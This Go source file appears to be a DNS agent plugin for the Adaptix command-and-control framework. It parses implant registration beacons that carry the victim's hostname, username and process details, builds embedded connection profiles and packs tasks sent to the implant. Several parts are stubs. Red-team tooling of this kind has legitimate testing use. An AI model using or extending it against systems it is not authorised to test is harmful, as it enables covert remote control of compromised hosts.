package main

import (
	"encoding/binary"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"math/rand/v2"

	"github.com/Adaptix-Framework/axc2"
)

// ---------------------------------------------------------------------------
// Teamserver interface — mirrors the full axc2 v1.2.0 surface.
// ---------------------------------------------------------------------------

type Teamserver interface {
	TsAgentIsExists(agentId string) bool
	TsAgentCreate(agentCrc string, agentId string, beat []byte, listenerName string, ExternalIP string, Async bool) (adaptix.AgentData, error)
	TsAgentProcessData(agentId string, bodyData []byte) error
	TsAgentUpdateData(newAgentData adaptix.AgentData) error
	TsAgentTerminate(agentId string, terminateTaskId string) error

	TsAgentUpdateDataPartial(agentId string, updateData interface{}) error
	TsAgentSetTick(agentId string, listenerName string) error

	TsAgentConsoleOutput(agentId string, messageType int, message string, clearText string, store bool)

	TsAgentGetHostedAll(agentId string, maxDataSize int) ([]byte, error)
	TsAgentGetHostedTasks(agentId string, maxDataSize int) ([]byte, error)
	TsAgentGetHostedTasksCount(agentId string, count int, maxDataSize int) ([]byte, error)

	TsTaskRunningExists(agentId string, taskId string) bool
	TsTaskCreate(agentId string, cmdline string, client string, taskData adaptix.TaskData)
	TsTaskUpdate(agentId string, updateData adaptix.TaskData)

	TsTaskGetAvailableAll(agentId string, availableSize int) ([]adaptix.TaskData, error)
	TsTaskGetAvailableTasks(agentId string, availableSize int) ([]adaptix.TaskData, int, error)
	TsTaskGetAvailableTasksCount(agentId string, maxCount int, availableSize int) ([]adaptix.TaskData, int, error)
	TsTasksPivotExists(agentId string, first bool) bool
	TsTaskGetAvailablePivotAll(agentId string, availableSize int) ([]adaptix.TaskData, error)

	TsClientGuiDisksWindows(taskData adaptix.TaskData, drives []adaptix.ListingDrivesDataWin)
	TsClientGuiFilesStatus(taskData adaptix.TaskData)
	TsClientGuiFilesWindows(taskData adaptix.TaskData, path string, files []adaptix.ListingFileDataWin)
	TsClientGuiFilesUnix(taskData adaptix.TaskData, path string, files []adaptix.ListingFileDataUnix)
	TsClientGuiProcessWindows(taskData adaptix.TaskData, process []adaptix.ListingProcessDataWin)
	TsClientGuiProcessUnix(taskData adaptix.TaskData, process []adaptix.ListingProcessDataUnix)

	TsCredentilsAdd(creds []map[string]interface{}) error
	TsCredentilsEdit(credId string, username string, password string, realm string, credType string, tag string, storage string, host string) error
	TsCredentialsSetTag(credsId []string, tag string) error
	TsCredentilsDelete(credsId []string) error

	TsDownloadAdd(agentId string, fileId string, fileName string, fileSize int64) error
	TsDownloadUpdate(fileId string, state int, data []byte) error
	TsDownloadClose(fileId string, reason int) error
	TsDownloadSave(agentId string, fileId string, filename string, content []byte) error
	TsDownloadGetFilepath(fileId string) (string, error)
	TsUploadGetFilepath(fileId string) (string, error)
	TsUploadGetFileContent(fileId string) ([]byte, error)

	TsListenerInteralHandler(watermark string, data []byte) (string, error)

	TsGetPivotInfoByName(pivotName string) (string, string, string)
	TsGetPivotInfoById(pivotId string) (string, string, string)
	TsGetPivotByName(pivotName string) *adaptix.PivotData
	TsGetPivotById(pivotId string) *adaptix.PivotData
	TsPivotCreate(pivotId string, pAgentId string, chAgentId string, pivotName string, isRestore bool) error
	TsPivotDelete(pivotId string) error

	TsScreenshotAdd(agentId string, Note string, Content []byte) error
	TsScreenshotNote(screenId string, note string) error
	TsScreenshotDelete(screenId string) error

	TsTargetsAdd(targets []map[string]interface{}) error
	TsTargetsCreateAlive(agentData adaptix.AgentData) (string, error)
	TsTargetsEdit(targetId string, computer string, domain string, address string, os int, osDesk string, tag string, info string, alive bool) error
	TsTargetSetTag(targetsId []string, tag string) error
	TsTargetRemoveSessions(agentsId []string) error
	TsTargetDelete(targetsId []string) error

	TsTunnelStart(TunnelId string) (string, error)
	TsTunnelCreateSocks4(AgentId string, Info string, Lhost string, Lport int) (string, error)
	TsTunnelCreateSocks5(AgentId string, Info string, Lhost string, Lport int, UseAuth bool, Username string, Password string) (string, error)
	TsTunnelCreateLportfwd(AgentId string, Info string, Lhost string, Lport int, Thost string, Tport int) (string, error)
	TsTunnelCreateRportfwd(AgentId string, Info string, Lport int, Thost string, Tport int) (string, error)
	TsTunnelUpdateRportfwd(tunnelId int, result bool) (string, string, error)

	TsTunnelStopSocks(AgentId string, Port int)
	TsTunnelStopLportfwd(AgentId string, Port int)
	TsTunnelStopRportfwd(AgentId string, Port int)

	TsTunnelConnectionClose(channelId int, writeOnly bool)
	TsTunnelConnectionHalt(channelId int, errorCode byte)
	TsTunnelConnectionResume(AgentId string, channelId int, ioDirect bool)
	TsTunnelConnectionData(channelId int, data []byte)
	TsTunnelConnectionAccept(tunnelId int, channelId int)
	TsTunnelPause(channelId int)
	TsTunnelResume(channelId int)

	TsTerminalConnExists(terminalId string) bool
	TsTerminalGetPipe(AgentId string, terminalId string) (*io.PipeReader, *io.PipeWriter, error)
	TsTerminalConnResume(agentId string, terminalId string, ioDirect bool)
	TsTerminalConnData(terminalId string, data []byte)
	TsTerminalConnClose(terminalId string, status string) error

	TsConvertCpToUTF8(input string, codePage int) string
	TsConvertUTF8toCp(input string, codePage int) string
	TsWin32Error(errorCode uint) string
}

// ---------------------------------------------------------------------------
// Plugin types and globals
// ---------------------------------------------------------------------------

type PluginAgent struct{}
type ExtenderAgent struct{}

var (
	Ts             Teamserver
	ModuleDir      string
	AgentWatermark string
)

// ---------------------------------------------------------------------------
// Plugin entry points (called by the axc2 loader)
// ---------------------------------------------------------------------------

// InitPlugin is the sole exported entry point required by the axc2 plugin loader.
func InitPlugin(ts any, moduleDir string, watermark string) adaptix.PluginAgent {
	ModuleDir = moduleDir
	AgentWatermark = watermark
	Ts = ts.(Teamserver)
	return &PluginAgent{}
}

func (p *PluginAgent) GetExtender() adaptix.ExtenderAgent {
	return &ExtenderAgent{}
}

// ---------------------------------------------------------------------------
// Helpers shared across files
// ---------------------------------------------------------------------------

func makeProxyTask(packData []byte) adaptix.TaskData {
	return adaptix.TaskData{Type: adaptix.TASK_TYPE_PROXY_DATA, Data: packData, Sync: false}
}

func getStringArg(args map[string]any, key string) (string, error) {
	v, ok := args[key].(string)
	if !ok {
		return "", fmt.Errorf("parameter '%s' must be set", key)
	}
	return v, nil
}

func getFloatArg(args map[string]any, key string) (float64, error) {
	v, ok := args[key].(float64)
	if !ok {
		return 0, fmt.Errorf("parameter '%s' must be set", key)
	}
	return v, nil
}

func getBoolArg(args map[string]any, key string) bool {
	v, _ := args[key].(bool)
	return v
}

// ---------------------------------------------------------------------------
// Tunnel callbacks (not used by DNS agent — return empty stubs)
// ---------------------------------------------------------------------------

func (ext *ExtenderAgent) TunnelCallbacks() adaptix.TunnelCallbacks {
	return adaptix.TunnelCallbacks{}
}

func TunnelMessageConnectTCP(channelId int, tunnelType int, addressType int, address string, port int) adaptix.TaskData {
	return makeProxyTask(nil)
}

func TunnelMessageConnectUDP(channelId int, tunnelType int, addressType int, address string, port int) adaptix.TaskData {
	return makeProxyTask(nil)
}

func TunnelMessageWriteTCP(channelId int, data []byte) adaptix.TaskData {
	return makeProxyTask(nil)
}

func TunnelMessageWriteUDP(channelId int, data []byte) adaptix.TaskData {
	return makeProxyTask(nil)
}

func TunnelMessagePause(channelId int) adaptix.TaskData {
	return makeProxyTask(nil)
}

func TunnelMessageResume(channelId int) adaptix.TaskData {
	return makeProxyTask(nil)
}

func TunnelMessageClose(channelId int) adaptix.TaskData {
	return makeProxyTask(nil)
}

func TunnelMessageReverse(tunnelId int, port int) adaptix.TaskData {
	return makeProxyTask(nil)
}

// ---------------------------------------------------------------------------
// Terminal callbacks (not used by DNS agent — return empty stubs)
// ---------------------------------------------------------------------------

func (ext *ExtenderAgent) TerminalCallbacks() adaptix.TerminalCallbacks {
	return adaptix.TerminalCallbacks{}
}

func TerminalMessageStart(terminalId int, program string, sizeH int, sizeW int, oemCP int) adaptix.TaskData {
	return makeProxyTask(nil)
}

func TerminalMessageWrite(terminalId int, oemCP int, data []byte) adaptix.TaskData {
	return makeProxyTask(nil)
}

func TerminalMessageClose(terminalId int) adaptix.TaskData {
	return makeProxyTask(nil)
}

// ---------------------------------------------------------------------------
// AgentProfile — the connection config embedded into the compiled payload.
// ---------------------------------------------------------------------------

// AgentProfile is the per-listener connection configuration marshalled to JSON
// and (optionally) written to a C header file during payload compilation.
type AgentProfile struct {
	Domain  string `json:"Domain"`
	Host    string `json:"Host"`
	Port    string `json:"Port"`
	Sleep   uint32 `json:"Sleep"`
	Jitter  uint8  `json:"Jitter"`
	AgentId string `json:"AgentId"`
}

// ---------------------------------------------------------------------------
// GenerateProfiles
// ---------------------------------------------------------------------------

// GenerateProfiles converts each TransportProfile (listener config) into a
// JSON-encoded AgentProfile blob.  The returned slice has one entry per
// listener — index matches profile.ListenerProfiles.
func (p *PluginAgent) GenerateProfiles(profile adaptix.BuildProfile) ([][]byte, error) {
	var agentProfiles [][]byte

	// Pull sleep / jitter from the builder AgentConfig if present.
	var builderConfig struct {
		Sleep  uint32 `json:"sleep"`
		Jitter uint8  `json:"jitter"`
	}
	// Ignore parse errors — defaults (0) are acceptable.
	_ = json.Unmarshal([]byte(profile.AgentConfig), &builderConfig)

	// Determine the agent watermark / ID to embed.
	agentId := AgentWatermark
	if agentId == "" {
		agentId = randomHex8()
	}

	for _, transportProfile := range profile.ListenerProfiles {
		var listenerMap map[string]any
		if err := json.Unmarshal(transportProfile.Profile, &listenerMap); err != nil {
			return nil, fmt.Errorf("GenerateProfiles: failed to unmarshal listener profile (watermark=%s): %w",
				transportProfile.Watermark, err)
		}

		// Extract common fields — fall back to empty string if absent.
		host, _ := listenerMap["host"].(string)
		if host == "" {
			host, _ = listenerMap["Host"].(string)
		}
		port := ""
		switch v := listenerMap["port"].(type) {
		case string:
			port = v
		case float64:
			port = fmt.Sprintf("%d", int(v))
		}
		if port == "" {
			switch v := listenerMap["Port"].(type) {
			case string:
				port = v
			case float64:
				port = fmt.Sprintf("%d", int(v))
			}
		}
		domain, _ := listenerMap["domain"].(string)
		if domain == "" {
			domain, _ = listenerMap["Domain"].(string)
		}

		ap := AgentProfile{
			Domain:  domain,
			Host:    host,
			Port:    port,
			Sleep:   builderConfig.Sleep,
			Jitter:  builderConfig.Jitter,
			AgentId: agentId,
		}

		b, err := json.Marshal(ap)
		if err != nil {
			return nil, fmt.Errorf("GenerateProfiles: failed to marshal AgentProfile: %w", err)
		}
		agentProfiles = append(agentProfiles, b)
	}

	return agentProfiles, nil
}

// ---------------------------------------------------------------------------
// BuildPayload
// ---------------------------------------------------------------------------

// BuildPayload stubs out payload compilation.  A real implementation would
// write agentProfiles[0] as a C header, invoke the cross-compiler via
// Ts.TsAgentBuildExecute, and return the resulting bytes.  For this DNS
// agent the payload is pre-compiled separately, so we return nil with no
// error to signal "no server-side build".
func (p *PluginAgent) BuildPayload(profile adaptix.BuildProfile, agentProfiles [][]byte) ([]byte, string, error) {
	// Stub — payload is compiled externally.
	return nil, "", nil
}

// ---------------------------------------------------------------------------
// CreateAgent — parse the registration beacon from the C payload
// ---------------------------------------------------------------------------

// CreateAgent parses a raw upstream registration packet (msg_type=0x01 data
// field) and returns an initialised AgentData.
//
// Registration data layout (after the 4-byte packet header has been stripped
// by the listener):
//
//	[8]  agent_id as ASCII hex bytes (e.g. "deadc0de")
//	[1]  hostname_len
//	[N]  hostname (UTF-8)
//	[1]  username_len
//	[N]  username
//	[4]  pid (LE uint32)
//	[1]  arch  (1=x64, 2=x86)
//	[1]  os_major
//	[1]  os_minor
//	[4]  sleep_ms (LE uint32)
//	[1]  jitter_pct
func (p *PluginAgent) CreateAgent(beat []byte) (adaptix.AgentData, adaptix.ExtenderAgent, error) {
	var agentData adaptix.AgentData

	offset := 0
	remaining := func(n int) bool { return offset+n <= len(beat) }

	// --- agent_id (8 ASCII hex bytes) ---
	if !remaining(8) {
		return agentData, &ExtenderAgent{}, errors.New("CreateAgent: beat too short (agent_id)")
	}
	agentID := string(beat[offset : offset+8])
	offset += 8

	// --- hostname ---
	if !remaining(1) {
		return agentData, &ExtenderAgent{}, errors.New("CreateAgent: beat too short (hostname_len)")
	}
	hostnameLen := int(beat[offset])
	offset++
	if !remaining(hostnameLen) {
		return agentData, &ExtenderAgent{}, errors.New("CreateAgent: beat too short (hostname)")
	}
	hostname := string(beat[offset : offset+hostnameLen])
	offset += hostnameLen

	// --- username ---
	if !remaining(1) {
		return agentData, &ExtenderAgent{}, errors.New("CreateAgent: beat too short (username_len)")
	}
	usernameLen := int(beat[offset])
	offset++
	if !remaining(usernameLen) {
		return agentData, &ExtenderAgent{}, errors.New("CreateAgent: beat too short (username)")
	}
	username := string(beat[offset : offset+usernameLen])
	offset += usernameLen

	// --- pid ---
	if !remaining(4) {
		return agentData, &ExtenderAgent{}, errors.New("CreateAgent: beat too short (pid)")
	}
	pid := binary.LittleEndian.Uint32(beat[offset:])
	offset += 4

	// --- arch ---
	if !remaining(1) {
		return agentData, &ExtenderAgent{}, errors.New("CreateAgent: beat too short (arch)")
	}
	archByte := beat[offset]
	offset++
	arch := "x64"
	if archByte == 2 {
		arch = "x86"
	}

	// --- os_major / os_minor ---
	if !remaining(2) {
		return agentData, &ExtenderAgent{}, errors.New("CreateAgent: beat too short (os version)")
	}
	osMajor := beat[offset]
	osMinor := beat[offset+1]
	offset += 2

	// --- sleep_ms ---
	if !remaining(4) {
		return agentData, &ExtenderAgent{}, errors.New("CreateAgent: beat too short (sleep_ms)")
	}
	sleepMs := binary.LittleEndian.Uint32(beat[offset:])
	offset += 4

	// --- jitter_pct ---
	if !remaining(1) {
		return agentData, &ExtenderAgent{}, errors.New("CreateAgent: beat too short (jitter_pct)")
	}
	jitterPct := beat[offset]
	// offset++ // last field, no further reads needed

	agentData = adaptix.AgentData{
		Id:         agentID,
		Name:       "dns_agent",
		Computer:   hostname,
		Username:   username,
		Pid:        fmt.Sprintf("%d", pid),
		Arch:       arch,
		Os:         adaptix.OS_WINDOWS,
		OsDesc:     fmt.Sprintf("Windows %d.%d", osMajor, osMinor),
		Sleep:      uint(sleepMs),
		Jitter:     uint(jitterPct),
		Async:      true,
		CreateTime: 0, // set by teamserver
	}

	return agentData, &ExtenderAgent{}, nil
}

// ---------------------------------------------------------------------------
// Encrypt / Decrypt — repeating-key XOR (4-byte key, cyclic)
// ---------------------------------------------------------------------------

// Encrypt and Decrypt are identity functions: the DNS listener handles all
// XOR encryption/decryption using the key derived from the agentId subdomain.
// The teamserver calls these with AgentData.SessionKey, which we leave nil.
func (ext *ExtenderAgent) Encrypt(data []byte, _ []byte) ([]byte, error) {
	return data, nil
}

func (ext *ExtenderAgent) Decrypt(data []byte, _ []byte) ([]byte, error) {
	return data, nil
}

// ---------------------------------------------------------------------------
// PackTasks — serialise pending tasks into the downstream wire format
// ---------------------------------------------------------------------------

// PackTasks serialises tasks into the format expected by the C payload:
//
//	[1]         num_tasks
//	for each task:
//	  [8]       task_id as ASCII hex bytes (TaskData.TaskId padded/trimmed to 8 chars)
//	  [1]       cmd_type      (first byte of TaskData.Data)
//	  [4]       cmd_data_len  (LE uint32)
//	  [N]       cmd_data
//
// TaskData.Data is expected to have been produced by buildTaskPayload() in
// commands.go, i.e. [1 cmd_type][4 cmd_data_len][N cmd_data].
func (ext *ExtenderAgent) PackTasks(agentData adaptix.AgentData, tasks []adaptix.TaskData) ([]byte, error) {
	if len(tasks) == 0 {
		return []byte{0x00}, nil
	}
	if len(tasks) > 255 {
		tasks = tasks[:255]
	}

	buf := make([]byte, 0, 1+len(tasks)*16)
	buf = append(buf, byte(len(tasks)))

	for _, task := range tasks {
		// 8-byte ASCII task ID — pad with '0' or truncate.
		tid := task.TaskId
		switch {
		case len(tid) < 8:
			for len(tid) < 8 {
				tid = "0" + tid
			}
		case len(tid) > 8:
			tid = tid[:8]
		}
		buf = append(buf, []byte(tid)...)

		// cmd_type, cmd_data_len, cmd_data are already encoded in task.Data
		// by buildTaskPayload().
		if len(task.Data) < 5 {
			// Malformed — emit a zero-length termination entry so the agent
			// skips it gracefully rather than parsing garbage.
			buf = append(buf, cmdTerminate)
			buf = append(buf, packU32LE(0)...)
			continue
		}
		buf = append(buf, task.Data...)
	}

	return buf, nil
}

// ---------------------------------------------------------------------------
// PivotPackData — not supported for DNS transport
// ---------------------------------------------------------------------------

func (ext *ExtenderAgent) PivotPackData(pivotId string, data []byte) (adaptix.TaskData, error) {
	taskData := adaptix.TaskData{
		TaskId: fmt.Sprintf("%08x", rand.Uint32()),
		Type:   adaptix.TASK_TYPE_PROXY_DATA,
		Data:   nil,
		Sync:   false,
	}
	return taskData, nil
}
